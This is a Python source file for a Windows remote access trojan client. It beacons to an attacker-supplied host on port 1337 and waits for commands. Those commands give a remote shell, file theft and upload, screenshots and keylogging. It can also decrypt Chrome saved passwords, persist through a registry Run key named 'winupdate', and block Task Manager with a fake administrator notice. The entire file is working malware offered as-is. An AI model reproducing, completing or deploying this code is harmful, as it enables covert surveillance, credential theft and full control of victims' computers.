import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard
import win32api, winerror, win32event, win32crypt
from shutil import copyfile
from winreg import *

strHost = "your ip address"
# strHost = socket.gethostbyname("")
intPort = 1337

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]


#  prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


while True:  # infinite loop until socket can connect
    try:
        objSocket = socket.socket()
        objSocket.connect((strHost, intPort))
    except socket.error:
        time.sleep(5)  # wait 5 seconds to try again
    else: break

strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
objSocket.send(str.encode(strUserInfo))
del strUserInfo  # delete data after it has been sent

# return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += " [" + str(event)[4:] + "] "
    else:
        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  #receive large amounts of data
    bytData = b""
    while True:
        bytPart = objSocket.recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


# vbs message box
def MessageBox(message):
    objVBS = open(TMP + "/m.vbs", "w")
    objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
    objVBS.close()
    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)


def startup():
    try:
        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
        copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
    except WindowsError:
        objSocket.send(str.encode("Unable to add to startup!"))
    else:
        objSocket.send(str.encode("success"))


def screenshot():
    pyscreeze.screenshot(TMP + "/s.png")

    # send screenshot information to server
    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
                              + " bytes" + "\n" + "Please wait..."))
    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
    time.sleep(1)
    objSocket.send(objPic.read())
    objPic.close()


def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arrRawDrives = arrRawDrives.split('\000')[:-1]

    strDrives = ""
    for drive in arrRawDrives:  # get proper view and place array into string
        strDrives += drive.replace("\\", "") + "\n"
    objSocket.send(str.encode(strDrives))

    strDir = decode_utf8(objSocket.recv(1024))

    if os.path.isdir(strDir):
        arrFiles = os.listdir(strDir)

        strFiles = ""
        for file in arrFiles:
            strFiles += (file + "\n")

        objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
        time.sleep(0.1)
        objSocket.send(str.encode(strFiles))

    else:  # if the user entered an invalid directory
        objSocket.send(str.encode("Invalid Directory!"))
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = decode_utf8(objSocket.recv(1024))

    try:
        objFile = open(strOutputFile, "wb")
        objFile.write(file_data)
        objFile.close()
        objSocket.send(str.encode("Done!!!"))
    except:
        objSocket.send(str.encode("Path is protected/invalid!"))


def receive(data):
    if not os.path.isfile(data):
        objSocket.send(str.encode("Target file not found!"))
        return

    objSocket.send(str.encode("File size: " + str(os.path.getsize(data))
                              + " bytes" + "\n" + "Please wait..."))
    objFile = open(data, "rb")  # send file contents and close the file
    time.sleep(1)
    objSocket.send(objFile.read())
    objFile.close()


def lock():
    ctypes.windll.user32.LockWorkStation()  # lock pc


def shutdown(shutdowntype):
    command = "shutdown {0} -f -t 30".format(shutdowntype)
    subprocess.Popen(command.split(), shell=True)
    objSocket.close()  # close connection and exit
    sys.exit(0)


def command_shell():
    strCurrentDir = str(os.getcwd())

    objSocket.send(str.encode(strCurrentDir))

    while True:
        strData = decode_utf8(objSocket.recv(1024))

        if strData == "goback":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it

            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
        else:
            bytData = str.encode("Error!!!")

        strBuffer = str(len(bytData))
        objSocket.send(str.encode(strBuffer))  # send buffer size
        time.sleep(0.1)
        objSocket.send(bytData)  # send output


def vbs_block_process(process, popup, message, title, timeout, type):
    # VBScript to block process, this allows the script to disconnect from the original python process

    strVBSCode = "On Error Resume Next" + "\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
                 "If LCase(objLatestProcess.TargetInstance.Name) = \"" + process + "\" Then" + "\n" + \
                 "objLatestProcess.TargetInstance.Terminate" + "\n"
    if popup == "True":  # if showing a message
        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"

    strVBSCode += "End If" + "\n" + "Loop"

    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
    objVBSFile.write(strVBSCode); objVBSFile.close()

    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if blnDisabled == "False":  # if task manager is already disabled, enable it
        objSocket.send(str.encode("Enabling ..."))

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)

        blnDisabled = "True"
    else:
        objSocket.send(str.encode("Disabling ..."))

        vbs_block_process("taskmgr.exe", "True", "Task Manager has been disabled by your administrator",
                      "Task Manager", "3", "16")
        blnDisabled = "False"


def chrpass():  # chrome password!
    strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"

    if not os.path.isfile(APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"):
        objSocket.send(str.encode("noexist"))
        return

    conn = sqlite3.connect(strPath)  # connect to database
    objCursor = conn.cursor()

    try:
        objCursor.execute("Select action_url, username_value, password_value FROM logins")  # look for credentials
    except:  # if the chrome is open
        objSocket.send(str.encode("error"))
        strServerResponse = decode_utf8(objSocket.recv(1024))

        if strServerResponse == "close":  # if the user wants to close the browser
            subprocess.Popen(["taskkill", "/f", "/im", "chrome.exe"], shell=True)
        return

    strResults = "Chrome Saved Passwords:" + "\n"

    for result in objCursor.fetchall():  # get data as raw text from sql db
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            strResults += "\n"+"Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: " \
                          + decode_utf8(password)+"\n"

    strBuffer = str(len(strResults))
    objSocket.send(str.encode(strBuffer))  # send buffer
    time.sleep(0.2)
    objSocket.send(str.encode(strResults))


def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            objSocket.send(str.encode("success"))
        else:
            objSocket.send(str.encode("error"))

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)  # re-initialise the thread
            strKeyLogs = ""
            objSocket.send(str.encode("success"))
        else:
            objSocket.send(str.encode("error"))

    elif option == "dump":
        if not KeyListener.running:
            objSocket.send(str.encode("error"))
        else:
            if strKeyLogs == "":
                objSocket.send(str.encode("error2"))
            else:
                time.sleep(0.2)
                objSocket.send(str.encode(str(len(strKeyLogs))))  # send buffer size
                time.sleep(0.2)
                objSocket.send(str.encode(strKeyLogs))  # send logs

                strKeyLogs = ""  # clear logs


def run_command(command):
    strLogOutput = "\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
    else:
        strLogOutput += "Error!!!"

    bytData = str.encode(strLogOutput)

    strBuffer = str(len(bytData))
    objSocket.send(str.encode(strBuffer))  # send buffer size
    time.sleep(0.1)
    objSocket.send(bytData)  # send output


try:
    while True:
        strData = objSocket.recv(1024)
        strData = decode_utf8(strData)

        if strData == "exit":
            objSocket.close()
            keylogger("stop")
            sys.exit(0)
        elif strData[:3] == "msg":
            MessageBox(strData[3:])
        elif strData[:4] == "site":
            webbrowser.get().open(strData[4:])
        elif strData == "startup":
            startup()
        elif strData == "screen":
            screenshot()
        elif strData == "filebrowser":
            file_browser()
        elif strData[:4] == "send":
            upload(strData[4:])
        elif strData[:4] == "recv":
            receive(strData[4:])
        elif strData == "lock":
            lock()
        elif strData == "shutdown":
            shutdown("-s")
        elif strData == "restart":
            shutdown("-r")
        elif strData == "test":
            continue
        elif strData == "cmd":
            command_shell()
        elif strData == "chrpass":
            chrpass()
        elif strData == "keystart":
            keylogger("start")
        elif strData == "keystop":
            keylogger("stop")
        elif strData == "keydump":
            keylogger("dump")
        elif strData[:6] == "runcmd":
            run_command(strData[6:])
        elif strData == "dtaskmgr":
            if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                blnDisabled = "True"
            disable_taskmgr()
except socket.error:  # if the server closes without warning
    objSocket.close()
    sys.exit(0)
